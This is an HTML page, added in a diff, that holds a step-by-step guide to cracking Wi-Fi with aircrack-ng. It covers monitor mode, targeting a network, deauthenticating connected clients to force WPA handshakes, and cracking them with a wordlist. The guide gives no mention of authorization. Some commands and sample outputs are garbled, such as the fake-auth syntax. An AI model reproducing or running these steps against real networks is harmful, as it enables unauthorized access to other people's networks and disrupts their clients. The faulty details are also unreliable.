@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>aircrack-ng</title>
+    <style>
+        body {
+            font-family: 'Lucida Console', Monaco, monospace;
+            margin: 20px;
+            background-color: #1c1c1c;
+            color: #e0e0e0;
+            line-height: 1.6;
+        }
+        h1 {
+            text-align: center;
+            color: #00ff00;
+            text-shadow: 1px 1px 3px #000;
+            font-size: 2.5em;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+        }
+        .button {
+            background: rgba(40, 40, 40, 0.8);
+            padding: 10px;
+            border-radius: 5px;
+            transition: background 0.3s, transform 0.3s;
+            text-align: center;
+        }
+        .button:hover {
+            background: rgba(50, 150, 50, 0.7);
+        }
+        a {
+            text-decoration: none;
+            color: #e0e0e0;
+            display: block;
+            transition: transform 0.3s;
+        }
+        a:focus {
+            transform: scale(1.1); /* Slightly enlarge the focused link */
+        }
+        a:hover {
+            color: #000;
+            background-color: #00ff00;
+            padding: 2px;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Aircrack-ng</h1>
+    <p>Aircrack-ng: Comprehensive Guide
+        1. Overview of Tools
+        
+            airodump-ng: Captures packets from wireless networks, providing information about available networks and connected clients.
+            aireplay-ng: Injects packets into the network to create traffic or perform attacks.
+            aircrack-ng: Cracks WEP and WPA/WPA2 encryption keys using captured packets.
+            airmon-ng: Configures your wireless interface to monitor mode.
+        
+        2. Setting Up Your Environment
+        
+            Enable Monitor Mode:
+        
+            bash
+        
+        sudo airmon-ng start wlan0
+        
+        Replace wlan0 with your specific wireless interface name.
+        
+        Verify Monitor Mode: Use iwconfig to check that your interface is in monitor mode. Look for wlan0mon or similar.
+        
+        Check for Interfering Processes: Run:
+        
+        bash
+        
+        sudo airmon-ng check kill
+        
+        This command stops processes that might interfere with Aircrack-ng.
+        
+        Confirm Interface Status: After enabling monitor mode, confirm that your interface is set up correctly:
+        
+        bash
+        
+        iwconfig
+        
+        Prepare for Packet Capture: Ensure your environment is ready to capture packets, typically in a location with accessible Wi-Fi networks.
+        
+        3. Capturing Wireless Traffic
+        
+            Start Airodump-ng:
+        
+            bash
+        
+        sudo airodump-ng wlan0mon
+        
+        This command starts capturing packets and displays nearby wireless networks.
+        
+        Identify Target Network: Look for the following information:
+        
+            BSSID: MAC address of the access point.
+            ESSID: Name of the network.
+            Channel: The channel the network operates on.
+        
+        Filter Captured Data: To filter for a specific network, note its BSSID and channel, then run:
+        
+        bash
+        
+        sudo airodump-ng --bssid <BSSID> -c <channel> wlan0mon
+        
+        Capture Handshake: To capture the WPA/WPA2 handshake, continue monitoring until a client connects or perform a deauthentication attack.
+        
+        Save Captured Data: To save the captured packets to a file, use:
+        
+        bash
+        
+            sudo airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0mon
+        
+            This saves the output to a file named capture.cap.
+        
+        
+        4. Targeting a Specific Network
+        
+            Capture Handshake: Start by running airodump-ng to capture packets from the target network:
+        
+            bash
+        
+        sudo airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0mon
+        
+        Replace <BSSID> and <channel> with the target network's BSSID and channel.
+        
+        Deauthenticate a Client (if needed): If no handshake is captured, you can force a client to reconnect by sending deauthentication packets:
+        
+        bash
+        
+        sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
+        
+        This command sends 10 deauth packets to the specified BSSID.
+        
+        Monitor for Handshake Capture: Watch the airodump-ng output for the message indicating that a handshake has been captured. It typically appears as:
+        
+        arduino
+        
+        WPA handshake: <BSSID>
+        
+        Save Captured Handshake: Ensure that the handshake is saved in your capture.cap file for later analysis.
+        
+        Verify the Capture: After capturing the handshake, you can verify it by using:
+        
+        bash
+        
+        aircrack-ng capture.cap
+        
+        
+        5. Generating Traffic for Handshake
+        
+            Use Aireplay-ng to Generate Traffic: To capture a WPA/WPA2 handshake, you can generate traffic on the target network. This can be done by deauthenticating a connected client, prompting them to reconnect.
+        
+            Deauthenticate a Client: Identify an active client connected to the target network. Use the following command:
+        
+            bash
+        
+        sudo aireplay-ng --deauth 10 -a <BSSID> -c <client-MAC> wlan0mon
+        
+        Replace <BSSID> with the target network's BSSID and <client-MAC> with the MAC address of the connected client. The 10 specifies the number of deauthentication packets to send.
+        
+        Monitor for Handshake: Keep airodump-ng running in a separate terminal window to watch for the handshake capture. You should see:
+        
+        arduino
+        
+        WPA handshake: <BSSID>
+        
+        Capture Additional Traffic: If you want to ensure more handshakes are captured, consider using the following to continuously send packets:
+        
+        bash
+        
+        sudo aireplay-ng --fake-auth <BSSID> wlan0mon
+        
+        Validate the Handshake: Once you have captured a handshake, ensure that it's saved in your capture.cap file for further analysis.
+        Validating the Handshake
+        
+        Once you have captured a handshake, follow these steps to validate it:
+        
+            Check the Capture File: Use the aircrack-ng tool to examine the contents of your capture file. Run the following command:
+        
+            bash
+        
+        aircrack-ng capture.cap
+        
+        Analyze Output: Look for output that indicates whether a valid handshake was detected. You should see a message like:
+        
+        arduino
+        
+        WPA handshake: <BSSID>
+        
+        Verify Handshake Quality: If a handshake is detected, you can also assess the quality of the capture by checking the number of packets captured:
+        
+            More packets generally indicate a better chance of successful cracking.
+        
+        Inspect with Wireshark (Optional): If you want a deeper analysis, open the capture file with Wireshark:
+        
+        bash
+        
+        wireshark capture.cap
+        
+            Look for packets labeled as EAPOL, which are essential for the WPA/WPA2 handshake.
+        
+        Crack the Handshake (Optional): If the handshake is valid, you can proceed to attempt cracking the password using a wordlist:
+        
+        bash
+        
+            aircrack-ng -w <path-to-wordlist> capture.cap
+        
+            Replace <path-to-wordlist> with the path to your dictionary file.
+        
+        By following these steps, you can confirm that you have successfully captured a valid WPA/WPA2 handshake for further analysis or password cracking.
+        
+        6. Cracking WPA/WPA2 Passwords
+        
+            Ensure You Have a Handshake: Before attempting to crack the password, confirm that you have captured a valid WPA/WPA2 handshake in your capture.cap file.
+        
+            Choose a Wordlist: Select a wordlist that contains potential passwords. You can use built-in wordlists like rockyou.txt, or create your own.
+        
+            Run Aircrack-ng: Use the following command to start the cracking process:
+        
+            bash
+        
+        aircrack-ng -w <path-to-wordlist> capture.cap
+        
+        Replace <path-to-wordlist> with the path to your wordlist file.
+        
+        Monitor Progress: As Aircrack-ng runs, it will display attempts and indicate when a password is found. It may look like this:
+        
+        makefile
+        
+        12345: 12:34:56:78:9A:BC
+        
+        Successful Crack: If successful, you will see output similar to:
+        
+        css
+        
+        KEY FOUND! [ password123 ] 
+        
+        Additional Options:
+        
+            If you have a custom wordlist, use it with:
+        
+            bash
+        
+        aircrack-ng -w /path/to/custom_wordlist.txt capture.cap</p>
+    
+
+</body>
+</html>
